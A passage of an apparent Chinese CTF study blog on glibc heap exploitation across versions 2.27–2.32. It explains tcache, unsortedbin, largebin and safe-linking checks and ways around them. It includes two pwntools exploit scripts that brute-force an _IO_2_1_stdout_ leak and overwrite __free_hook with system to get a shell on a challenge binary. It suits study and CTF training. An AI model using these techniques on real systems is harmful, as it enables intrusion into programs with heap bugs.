由于tcache的stashing机制，如果从fastbin中取chunk，那么如果该大小的fastbin链中还有其他chunk，则会尝试将该大小的fastbin链中剩余的chunk都放入对应大小的tcache中，那么就会出现如上的对fastbin中的fd进行取出检查，这里我设置了fastbin中Chunk的fd为0x71，即rdx的值，导致出错。\n\n```c\n//注释头\n\n*fb = tc_victim->fd;\n\nmov    rax, qword ptr [rdx + 0x10]\n```\n\n这个代码以及汇编赋值，使得[rdx+0x10]，即取0x71的fd指针，那肯定会出错。同样的，如果修改fastbin中chunk的fd也不再是简单地伪造size了，还需要考虑对应FD的fd指针有效性。\n\n### (2)对抗利用：\n\n#### ①have_fastchunks:\n\n虽然FD不能留下伪造地址，但是可以释放一个chunk进入fastbin，将main_arena.have_fastchunks置1，之后利用main_arena.have_fastchunks留下的0x1在上面来申请0x100的字节错位，但是这个需要先修改global_max_fast才能申请0x100的fastbinChunk。\n\n![Snipaste_2021-08-27_14-48-12](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144821.png)\n\n#### ④top_chunk:\n\n此外，借用爆破chunk地址，将top_chunk的0x56当作合法size也是可以的。\n\n![Snipaste_2021-08-27_14-42-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144239.png)\n\n但是其实也没差，既然有tcache，那我还用fastbin申请干啥，直接tcache获得地址之后任意申请不就完了，除非全是calloc，但这种情况其实还有更方便的解法，即`house of banana`。所以要是碰到2.27版本的，简直就是烧高香了。\n\n## 2.Glibc2.27Tcache题外话：\n\n现今版本，2020年09月10日开始，从2.27-3ubuntu1.3开始，就已经对tcache做了部分修改，很接近2.29的，而现在的题目基本都是基于这种增强型版本的，已经不存在double free了。\n\n[Glibc 2.27关于Tcache的增强保护 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/219292#h2-2)\n\n新增如下：\n\n### (1)Key字段新增：\n\n```c\n/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n```\n\n同样的对应tcache_put会加入key字段，tcache_get中会清除key字段，_int_free函数会**根据key字段**判断double free。\n\n这里讲个小技巧，如果发现题目的libc.so版本在2.27-3ubuntu1.3之下，那么就没有key字段，存在无限制的double free，直接搞定。而常规的2.28版本其实也还存在double free，查看_int_free相关源码即可发现。\n\n具体利用和绕过后面讲。\n\n### (2)Tcache数量限制\n\n```c\n#define MAX_TCACHE_COUNT 127    /* Maximum value of counts[] entries.  */\n```\n\n这个没发现有啥用，传统的只有2.30开始才用到了这个，低版本连定义都没有，除了这个增强型的2.27\n\n```c\n//2.30\n\ndo_set_tcache_count (size_t value)\n{\n    if (value <= MAX_TCACHE_COUNT)\n    {\n        LIBC_PROBE (memory_tunable_tcache_count, 2, value, mp_.tcache_count);\n        mp_.tcache_count = value;\n    }\n    return 1;\n}\n```\n\n这就很迷惑，通常定义的tcache_count是7，而这里却要求小于MAX_TCACHE_COUNT(127)，是因为GNU的其他功能可能会改变tcache的结构吗，比如将tcache_count修改为127，扩大tcache来使用吗，等待大佬发现漏洞。\n\n另外该文章中还说了realloc对应memcpy的使用修改，感觉没啥用。\n\n总的来说，其实就相当于将2.27的tcache增强成了2.29，其他的到没啥变化。\n\n\n\n# 五、Glibc2.29\n\n## 1.部分手段失效\n\n### (1)unsortedbin attack失效\n\n这个版本下的unsortedbin attck已经失效，原因是新增如下检查：\n\n```c\n#注释头\n\nmchunkptr next = chunk_at_offset (victim, size);\nif (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)\n    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))\n    malloc_printerr (\"malloc(): invalid next size (unsorted)\");\nif (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))\n    malloc_printerr (\"malloc(): mismatching next->prev_size (unsorted)\");\nif (__glibc_unlikely (bck->fd != victim)\n    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))\n    malloc_printerr (\"malloc(): unsorted double linked list corrupted\");\nif (__glibc_unlikely (prev_inuse (next)))\n    malloc_printerr (\"malloc(): invalid next->prev_inuse (unsorted)\");\n```\n\n①下一个chunk的size是否在合理区间\n\n②下一个chunk的prevsize是否等于victim的size\n\n③检查unsortedbin双向链表的完整性\n\n④下一个chunk的previnuse标志位是否为0\n\n其实最要命的是检查双向链表的完整性，还得在目的地址的fd伪造victim，都能伪造地址了还用这，所以直接废弃。Tcache_Stashing_Unlink_Attack来类似代替unsortedbin attack，不过Tcache_Stashing_Unlink_Attack一般需要用到calloc，如果有UAF泄露地址的话倒是不太需要。\n\n### (2)top_chunk改写限制\n\n新增检查：\n\n```C\n#注释头\n\nif (__glibc_unlikely (size > av->system_mem))  //0x21000        \n    malloc_printerr (\"malloc(): corrupted top size\");\n```\n\n即size需要小于等于system_mems = 0x21000。之前由top_chunk引发的一系列漏洞，类似House of orange,\n\nHouse of Force以及之前提到的修改top_chunk到malloc_hook附近等，都不太行了。\n\n### (3)unlink方面一些限制\n\n新增检查：\n\n```c\n#注释头\n\nif(__glibc_unlikely (chunksize(p) != prevsize))\t*//new*        \n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n即会判断找到的之前为Free状态的chunk和当前要释放chunk的prevsize是否相等\n\n这个对于UAF方面来说没啥影响，因为UAF本身就基本直接造成堆块重叠，而unlink通常就是结合off-by-null来制造堆块重叠的。off-by-null和off-by-one之后开一个专门的来讨论。\n\n### (4)tcache方面的变化\n\n#### ①新增key字段\n\n```c\n#注释头\n\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n\n//-------------------------------------------------------------------------------\n\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n    assert (tc_idx < TCACHE_MAX_BINS);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\t//add\n\n    e->next = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    assert (tc_idx < TCACHE_MAX_BINS);\n    assert (tcache->entries[tc_idx] > 0);\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\t//add\n    return (void *) e;\n}\n\n\n```\n\n即会在释放chunk的bk处加入key字段，一般为heap_base+0x10，即当前线程的tcache struct的地方。释放时赋值，申请回来时置零。\n\n#### ②新增的一些检查\n\n```c\n//注释头\n\n{\n    size_t tc_idx = csize2tidx (size);\n    if (tcache != NULL && tc_idx < mp_.tcache_bins)\n    {\n        /* Check to see if it's already in the tcache.  */\n        tcache_entry *e = (tcache_entry *) chunk2mem (p);\n\n        /* This test succeeds on double free.  However, we don't 100%\n   trust it (it also matches random payload data at a 1 in\n   2^<size_t> chance), so verify it's not an unlikely\n   coincidence before aborting.  */\n        if (__glibc_unlikely (e->key == tcache))\n        {\n            tcache_entry *tmp;\n            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n            for (tmp = tcache->entries[tc_idx];\n                 tmp;\n                 tmp = tmp->next)\n                if (tmp == e)\n                    malloc_printerr (\"free(): double free detected in tcache 2\");\n            /* If we get here, it was a coincidence.  We've wasted a\n       few cycles, but don't abort.  */\n        }\n\n        if (tcache->counts[tc_idx] < mp_.tcache_count)\n        {\n            tcache_put (p, tc_idx);\n            return;\n        }\n    }\n}\n```\n重点是这里**if (__glibc_unlikely (e->key == tcache))**，即针对之前tcache dup做的限制，检查要释放chunk的key字段，如果等于tcache结构体地址，则遍历对于的tcache中的chunk是否和该chunk为同一个chunk，是则报错。这个好绕过，通常可以利用漏洞改掉tcache中对于chunk的bk指针即可。由于unsortedbin attack失效，而Tcache_Stashing_Unlink_Attack通常还需要结合堆溢出，UAF之类的漏洞，所以常常可以**配合largebin attack来进行攻击tcache dup。**\n\n▲还有一点需要注意的是，有的2.27版本已经引入了2.29中的一些机制，刚刚提到的，比如key字段之类的，具体做题具体分析。\n\n参考：[glibc-2.29新增的保护机制学习总结 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/194960#h2-1)\n\n#### ③出现的新手段\n\nTcache stash unlink attack，很多师傅分析这个漏洞都是在2.29下开始分析，但实际上从最开始引入2.26的tcache就已经有了，只不过可能是之前的unsortedbin attack太好用，就没开发出来这个漏洞。\n\n```c\n//2.26  \n\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n\n//2.32\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n```\n\n可以看到几乎是一样的，只有一两处：\n\nA.2.26判断了smallbin是否为空，为空则会调用**malloc_consolidate**进行初始化，但是从2.27开始就没有了。这个在针对**malloc_consolidate**进行攻击的时候可能会用到。\n\nB.错误打印方式不同：\n\n```c\n//2.26\nerrstr = \"malloc(): smallbin double linked list corrupted\";\ngoto errout;\n\n//errout define 2 time\nerrout:\n    if (!have_lock && locked)\n        __libc_lock_unlock (av->mutex);\n    malloc_printerr (check_action, errstr, chunk2mem (p), av);\n    return;\n}\n\nerrout:\n    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);\n    return NULL;\n}\n\n//2.27及以上\nmalloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n```\n\n这个在针对**malloc_printerr**也可能会用到\n\n而这种攻击主要是针对smallbin攻击的。\n\n但也有一种针对fastbin攻击的：\n\n[Tcache Stashing Unlink Attack利用思路 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/198173)\n\n这个后面再讨论下。\n\n## 2.UAF常见限制\n\n### (1)UAF + Leak + Size不做限制：\n\n这个没啥好说的，直接泄露地址之后任意申请就完了。\n\n### (2)UAF+Leak+Size做限制:\n\n结合之前的，小Chunk就修改size，可以放入unsortedbin就填满Tcache之后放入泄露地址后任意申请即可。\n\n### (3)UAF+无Leak+Size不做限制:\n\n一般很多tcache的题都会对size做限制，但是其实对于tcache的UAF来说，没啥大用，都能绕过，像我下面对于0x4f8的chunk就可以利用修改size来伪造，和之前基本一致。\n\n由于tcache没什么限制，我们可以利用unsortedbin踩下地址后，对应修改fd即可实现爆破申请_IO_2_1_stdout结构体，修改flag和部分字节写write_base,write_end来泄露地址，然后就可以任意申请了。\n\n```python\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xf000\n\tguess_heap = 0xf000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\tadd_malloc(0x4f8,\"\\x00\"*0x4f8)\t\t\t\t#idx\t0x1\n\t\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0x2\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x4\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0x5\n\n\n\t#write libc addr\n\tfree(0x1)\n\tadd_malloc(0x78,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0x6\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\tfree(0x2)\n\tfree(0x4)\n\tedit(0x4,0x2,p16((guess_heap+0x1000+0x10)&0xffff))\n\n\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0x7\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x8\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x9\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xa\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xb\n\tfree(0xa)\n\tfree(0xb)\n\tedit(0xb,0x8,p64(libc_base+libc.sym['__free_hook']))\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xc\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0xd\n\tfree(0xc)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n当然这种解法有点没效率，因为需要同时爆破Libc和heap的各半个字节，总共一个字节，总的来说数学期望为1/256。但是观察上面我们可以看到由于tcache机制，同处于0x100一个内存页下的Chunk前面的都一样，不用爆破，那么只需要修改最后一个字节即可完成tcache链表的修改，这样爆破的期望就下降到了半个字节，数学期望1/16，明显提升了很大效率，比赛时直冲一血，嘿嘿：\n\n```python\n#注释头\n\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xd000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\ttcacheMalloc(0x98) \t\t#idx 0x1~0x7\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x8\n\t\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x9\n\n\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0xc\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0xd\n\n\n\t#write libc addr\n\ttcacheDelete(0x1)\n\tfree(0x9)\n\tadd_malloc(0x38,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0xe\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\t#change 0x40 link_list\n\tfree(0xa)\n\tfree(0xc)\n\tedit(0xc,0x1,'\\x10')\n\t\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0xf\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x10\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x11\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x12\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x13\n\tfree(0x12)\n\tfree(0x13)\n\tedit(0x13,0x8,p64(libc_base+libc.sym['__free_hook']))\n\t\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x14\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0x15\n\tfree(0x14)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n#### ▲爆破题外话：\n\n之前没怎么发现，这里发现PIE+ASLR出来的Libc地址开头可能是0x7e，而且中间也有可能会出现\\x00的情况，这样就很容易使得我们爆破的次数直线上涨，所以在调试好了之后，爆破会加入\n\n```python\n#注释头\n\ncontext.timeout = 0.5\n#----------------------------------------------------------------------\nexcept Exception:\n    p.close()\n\tcontinue\n```\n\n来简单对抗这两种变化，防止爆破中断，但是这个也会把其他的一些错误给忽略，比如说libc.sym['main_arena']，如果给的Libc没有debug信息，那么就搜索不到main_arena，就会出错，而如果加入了上述代码，就会忽略掉，然后重启。\n\n还有的就是需要看下main_arena的地址，爆破的时候可能会和_IO_2_1_stdout相差一点。最好加上打印：\n\n```python\nIO_2_1_stdout_ = guess_libc + libc.sym['_IO_2_1_stdout_']\nlg(\"_IO_2_1_stdout_\",_IO_2_1_stdout_)\n```\n\n\n\n### (4)UAF+无Leak+Size做限制:\n\n一般很多tcache的题都会对size做限制，要么小，要么大。但是其实对于tcache的UAF来说，没啥大用，都能绕过，不像fastbin一样，需要在目的地址伪造size。所以这里基本上修改一下size都可以得到对应解法，这种题目更多应该是考察堆布局的能力。需要有一个对于所有chunk进行布局的能力，最好准备草稿纸写写画画(excel也行).....\n\n\n\n# 六、Glibc2.31\n\n## 1.部分手段失效\n\n### (1)原始largebin attack失效\n\n从2.30开始将从unsortebin放入largebin的代码中在size比较的其中一个分支新增检查：\n\n```c\n//注释头\n\n//unsortedbin chunk->size < largebin chunk->size\nif ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))\n{\n    fwd = bck;\n    bck = bck->bk;\n    victim->fd_nextsize = fwd->fd;\n    victim->bk_nextsize = fwd->fd->bk_nextsize;\n    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n}\nelse //unsortedbin chunk->size >= largebin chunk->size\n{\n    assert (chunk_main_arena (fwd));\n    while ((unsigned long) size < chunksize_nomask (fwd))\n    {\n        fwd = fwd->fd_nextsize;\n        assert (chunk_main_arena (fwd));\n    }\n\n    if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))\n    /* Always insert in the second position.  */\n    \tfwd = fwd->fd;\n    else\n    {\n        victim->fd_nextsize = fwd;\n        victim->bk_nextsize = fwd->bk_nextsize;\n        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n        \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n        fwd->bk_nextsize = victim;\n        victim->bk_nextsize->fd_nextsize = victim;\n    }\n    bck = fwd->bk;\n    if (bck->fd != fwd)\n    \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n}\n\n```\n\n即当发生从unsortedbin中转移到largbin中时，如果unsortedbin中要转移的chunk的size大于largebin中原本就有的尾部chunk的size，就会触发新增的检查。否则，则不会触发新增的检查。\n\n而新增检查的意思其实就是检查双向链表的完整性，这和之前unsortedbin失效加入的检查如出一辙。\n\n```C\n//注释头\n\nif (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n```\n\n```C\n//注释头\n\nif (bck->fd != fwd)\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n```\n\n但是由于当size小于的时候没有检查，所以largebin attack还是可以用的，只要unsortedbin中要放入largebin中的chunk的size小于largebin中chunk的size即可，但是这里的largebin attack已经被降级，相比之前的两个地址任意写，限制只能写一个地址了。\n\n### (2)Tcache结构扩大\n\n之前版本的tcache中count一直是一个字节，这回从2.30开始就变成了两个字节：\n\n```c\n//注释头\n\n//2.29\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n//2.30\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n```\n\n所以tcache的结构体也从0x250扩大为0x290\n\n### (3)删除了一些assert\n\n在2.30版本及之后，删除了一些有关tcache的assert\n\n```c\n//注释头\n\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.30\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n\n//2.30\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\n以前就想着是不是能像控fastbinY溢出一样来控tcache溢出呢，但在2.29及以前肯定是不行的，因为有assert存在。就算修改了mp_.tcache_bins，成功进入tcache_put也会因为assert(tc_idx<TCACHE_MAX_BINS)的断言使得程序退出。\n\n```c\n//注释头\n\nif (tcache && tc_idx < mp_.tcache_bins)\n{\n    mchunkptr tc_victim;\n    /* While bin not empty and tcache not full, copy chunks.  */\n    while (tcache->counts[tc_idx] < mp_.tcache_count\n           && (tc_victim = *fb) != NULL)\n    {\n        if (SINGLE_THREAD_P)\n            *fb = tc_victim->fd;\n        else\n        {\n            REMOVE_FB (fb, pp, tc_victim);\n            if (__glibc_unlikely (tc_victim == NULL))\n                break;\n        }\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n\nif (tc_idx < mp_.tcache_bins\n      && tcache\n      && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\n但是新版本删去了这个操作，那么如果我们能够修改mp_.tcache_bins，就将能够调用tcache_put函数，将tcache结构体往后溢出，就像修改global_max_fast一样，实在是有点逗，不知道为什么新版本要删掉，这个就引入了一种新的方法：[glibc 2.27-2.32版本下Tcache Struct的溢出利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235821)。这个我个人还是觉得这位师傅讲的还是有点出入，因为是2.30才删去的，2.29及以前是不存在这种方法的，包括用2.29调试也是的。\n\n### (4)对count新增了一些限制\n\n```C\n//2.29\nif (tc_idx < mp_.tcache_bins\n    /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */\n    && tcache\n    && tcache->entries[tc_idx] != NULL)\n{\n    return tcache_get (tc_idx);\n}\n\n//2.30\nif (tc_idx < mp_.tcache_bins\n    && tcache\n    && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\n从2.30开始在`_libc_malloc`中准备从tcache中申请时，会判断`counts[tc_idx]`是否大于0，不大于0则不会从tcache中申请。所以有时候我们使用直接修改fd的办法需要考虑到数量是否会被清0。但是在`_int_free`中却没有新增类似的检查。\n\n\n\n## 2.UAF常见限制\n\n### (1)UAF+Leak+Size不做限制:\n\n这里也不需要多讲，放入unsortedbin后直接泄露地址之后任意申请就完了。\n\n### (2)UAF+Leak+Size做限制:\n\n结合之前的，小Chunk就修改size，可以放入unsortedbin的就填满Tcache之后放入泄露地址后任意申请即可。\n\n### (3)UAF+无Leak+Size不做限制:\n\n其实和2.29差不多，只是失效了一些手段，比如传统的largebin attack失效。而之前在2.29中讲到的相关方法其实也一样可以直接用上。爆破_IO_2_1_stdout泄露地址，之后任意申请修改__free_hook即可。\n\n### (4)UAF+无Leak+Size做限制:\n\n同样还是需要通过堆布局来修改size，制造unsortedbin chunk。\n\n# 七、Glibc2.32\n\n## 1.新增机制\n\n### (1)Tcache和Fastbin新增指针异或检查的safe-linking机制\n\n#### ①引入一个宏定义\n\n```c\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\n即将传入的pos右移12bit后和ptr异或。\n\n#### ②实际应用\n\n##### Tcache中\n\n```c\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\n\n    e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n```\n\n##### Fastbin中\n\n```c\nif (SINGLE_THREAD_P)\n{\n    /* Check that the top of the bin is not the record we are going to\n   add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n        malloc_printerr (\"double free or corruption (fasttop)\");\n    p->fd = PROTECT_PTR (&p->fd, old);\n    *fb = p;\n}\nelse\n    do\n    {\n        /* Check that the top of the bin is not the record we are going to\n     add (i.e., double free).  */\n        if (__builtin_expect (old == p, 0))\n            malloc_printerr (\"double free or corruption (fasttop)\");\n        old2 = old;\n        p->fd = PROTECT_PTR (&p->fd, old);\n    }\nwhile ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))\n       != old2);\n```\n\n再加上其他\n\n```c\np->fd = PROTECT_PTR (&p->fd, old);\n//----------------------------------------\np = REVEAL_PTR (p->fd);\n//----------------------------------------\ntcache_tmp->entries[i] = REVEAL_PTR (e->next);\n//----------------------------------------\n*fb = REVEAL_PTR (victim->fd);\n//----------------------------------------\n*fb = REVEAL_PTR (tc_victim->fd);\n//----------------------------------------\ntmp = REVEAL_PTR 